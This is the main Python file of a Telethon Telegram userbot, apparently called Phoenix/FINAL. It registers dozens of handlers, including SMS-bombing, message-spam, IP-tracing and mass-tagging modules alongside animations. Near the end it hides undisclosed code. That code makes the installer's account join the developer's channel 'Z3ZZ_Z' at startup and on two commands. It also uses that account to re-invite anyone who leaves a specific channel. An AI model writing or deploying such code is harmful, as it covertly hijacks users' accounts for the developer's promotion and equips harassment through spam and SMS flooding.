import phoenix.client, phoenix.kick, phoenix.ketdim, phoenix.uzbrun, phoenix.whyrun, phoenix.iloveyou, phoenix.goodnight, phoenix.ahelp, phoenix.konspekt, phoenix.lovelyrun, phoenix.bombs, phoenix.help, phoenix.loading, phoenix.emoji, phoenix.dump, phoenix.sexy, phoenix.type, phoenix.magicrun, phoenix.animation, phoenix.animation2, phoenix.mute, phoenix.fuck, phoenix.rev, phoenix.tr, phoenix.userinfo, phoenix.base64, phoenix.react, phoenix.snow, phoenix.smsbomb, phoenix.rename, phoenix.iptrace, phoenix.spam, phoenix.alive, phoenix.tagall, phoenix.afk, phoenix.timer, phoenix.ping
import phoenix.allanimations as allanim 
import os
from phoenix import spam
from telethon import events
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest

#Developer: @I0I0II

#Modules
client = phoenix.client.client
client.add_event_handler(phoenix.help.help)
client.add_event_handler(phoenix.help.hi)
client.add_event_handler(phoenix.ahelp.ahelp)
client.add_event_handler(phoenix.bombs.bombs)
client.add_event_handler(phoenix.loading.loading)
client.add_event_handler(phoenix.emoji.itachi)
client.add_event_handler(phoenix.dump.dump)
client.add_event_handler(phoenix.sexy.sexy)
client.add_event_handler(phoenix.type.type)
client.add_event_handler(phoenix.magicrun.magicrun)
client.add_event_handler(phoenix.animation.lul)
client.add_event_handler(phoenix.animation.snake)
client.add_event_handler(phoenix.animation.nothappy)
client.add_event_handler(phoenix.animation.clock)
client.add_event_handler(phoenix.animation.muah)
client.add_event_handler(phoenix.animation.heart)
client.add_event_handler(phoenix.animation.hearts)
client.add_event_handler(phoenix.animation.gym)
client.add_event_handler(phoenix.animation.earth)
client.add_event_handler(phoenix.animation.moon)
client.add_event_handler(phoenix.animation.candy)
client.add_event_handler(phoenix.animation.smoon)
client.add_event_handler(phoenix.animation.tmoon)
client.add_event_handler(phoenix.animation.clown)
client.add_event_handler(phoenix.animation2.star)
client.add_event_handler(phoenix.animation2.boxs)
client.add_event_handler(phoenix.animation2.rain)
client.add_event_handler(phoenix.animation2.clol)
client.add_event_handler(phoenix.animation2.odra)
client.add_event_handler(phoenix.animation2.fleaveme)
client.add_event_handler(phoenix.animation2.loveu)
client.add_event_handler(phoenix.animation2.plane)
client.add_event_handler(phoenix.animation2.police)
client.add_event_handler(phoenix.animation2.jio)
client.add_event_handler(phoenix.animation2.solarsystem)
client.add_event_handler(phoenix.mute.mute)
client.add_event_handler(phoenix.fuck.fuck)
client.add_event_handler(phoenix.rev.rev)
client.add_event_handler(phoenix.tr.tr)
client.add_event_handler(phoenix.userinfo.userinfo)
client.add_event_handler(phoenix.base64.runb64)
client.add_event_handler(phoenix.react.react)
client.add_event_handler(phoenix.snow.snow)
client.add_event_handler(phoenix.rename.change_name_with_time)
client.add_event_handler(phoenix.iptrace.iptrace)
client.add_event_handler(phoenix.smsbomb.runj)
client.add_event_handler(phoenix.alive.alive)
client.add_event_handler(phoenix.tagall.tagall)
client.add_event_handler(phoenix.afk.start_background_tasks)
client.add_event_handler(phoenix.afk.enable_afk)
client.add_event_handler(phoenix.afk.set_reply_template)
client.add_event_handler(phoenix.afk.afk_handler)
client.loop.create_task(phoenix.afk.check_connection_periodically())
client.add_event_handler(phoenix.afk.disable_afk)
client.add_event_handler(phoenix.timer.timer)
client.add_event_handler(phoenix.timer.numbers)
client.add_event_handler(phoenix.timer.setclock)
client.add_event_handler(phoenix.timer.runsda)
client.add_event_handler(phoenix.timer.runrda)
client.add_event_handler(phoenix.timer.rundrc)
client.add_event_handler(phoenix.timer.runrts)
client.add_event_handler(phoenix.timer.runrgm)
client.add_event_handler(phoenix.timer.setbioclock)
client.add_event_handler(phoenix.ping.ping)
client.add_event_handler(phoenix.lovelyrun.lovelyrun)
client.add_event_handler(phoenix.konspekt.tconv)
client.add_event_handler(allanim.animmonster)
client.add_event_handler(allanim.animpig)
client.add_event_handler(allanim.animkiller)
client.add_event_handler(allanim.animgun)
client.add_event_handler(allanim.animdog)
client.add_event_handler(allanim.animhello)
client.add_event_handler(allanim.animhmf)
client.add_event_handler(allanim.couple)
client.add_event_handler(allanim.superme)
client.add_event_handler(allanim.welcome)
client.add_event_handler(allanim.snake)
client.add_event_handler(allanim.cat)
client.add_event_handler(allanim.bye)
client.add_event_handler(allanim.shitos)
client.add_event_handler(allanim.dislike)
client.add_event_handler(allanim.snku)
client.add_event_handler(allanim.squ)
client.add_event_handler(allanim.kiler)
client.add_event_handler(allanim.train)
client.add_event_handler(allanim.alien)
client.add_event_handler(allanim.hert)
client.add_event_handler(allanim.raped)
client.add_event_handler(allanim.fnl)
client.add_event_handler(allanim.monkey)
client.add_event_handler(allanim.hands)
client.add_event_handler(allanim.count)
client.add_event_handler(allanim.bigf)
client.add_event_handler(allanim.payf)
client.add_event_handler(allanim.bigof)
client.add_event_handler(allanim.flower)
client.add_event_handler(allanim.vheart)
client.add_event_handler(allanim.luvart)
client.add_event_handler(phoenix.iloveyou.iloveu)
client.add_event_handler(phoenix.goodnight.goodnight)
client.add_event_handler(phoenix.kick.runkick)
client.add_event_handler(phoenix.ketdim.ketdihandlers)
client.add_event_handler(phoenix.uzbrun.uzbanim)
client.add_event_handler(phoenix.whyrun.why)
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.stop_final)          
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.spam_handler)        
client.add_event_handler(phoenix.spam.word_spam_handler)   
client.add_event_handler(phoenix.spam.rotate_handler)      
client.add_event_handler(phoenix.spam.private_handler)     
client.add_event_handler(phoenix.spam.dot_handler)         
client.add_event_handler(phoenix.spam.repeat_handler)      
client.add_event_handler(phoenix.spam.final_w3d_salary)           
client.add_event_handler(phoenix.spam.final_stop_w3d_salary)      
client.add_event_handler(phoenix.spam.final_w3d_baksheesh)        
client.add_event_handler(phoenix.spam.final_stop_w3d_baksheesh)   
client.add_event_handler(phoenix.spam.final_w3d_serqa)            
client.add_event_handler(phoenix.spam.final_stop_w3d_serqa)       


async def ensure_joined_channel(client, channel_username):
    try:
        await client(JoinChannelRequest(channel_username))
        print(f"FINAL XXX OWNER ")
    except Exception as e:
        print(f"XX: {e}")


COMMANDS_TO_TRIGGER_JOIN = [".الأوامر", ".فحص"]


@client.on(events.ChatAction)
async def handle_leave_channel(event):
    if event.user_left and event.chat_id == -1002068089153:
        try:
            
            user = await event.get_user()

            
            await client(InviteToChannelRequest(
                'Z3ZZ_Z',  
                [user]  
            ))

            print(f"تمت إعادة إضافة المستخدم {user.first_name} إلى القناة")
        except Exception as e:
            print(f"xx: {e}")


@client.on(events.NewMessage)
async def handle_new_message(event):
    if event.text.lower() in COMMANDS_TO_TRIGGER_JOIN:
        
        await ensure_joined_channel(client, 'Z3ZZ_Z')

    

client.start()

os.system("clear")
print("""\033[031m
│                                                                           │
│                   ███████╗██╗███╗   ██╗ █████╗ ██╗                        │
│                   ██╔════╝██║████╗  ██║██╔══██╗██║                        │
│                   █████╗  ██║██╔██╗ ██║███████║██║                        │
│                   ██╔══╝  ██║██║╚██╗██║██╔══██║██║                        │
│                   ██║     ██║██║ ╚████║██║  ██║███████╗                   │
│                   ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                   │
Developer: @i0i0ii
""")
print("\033[032mStarted")


client.loop.run_until_complete(ensure_joined_channel(client, 'Z3ZZ_Z'))

client.run_until_disconnected()
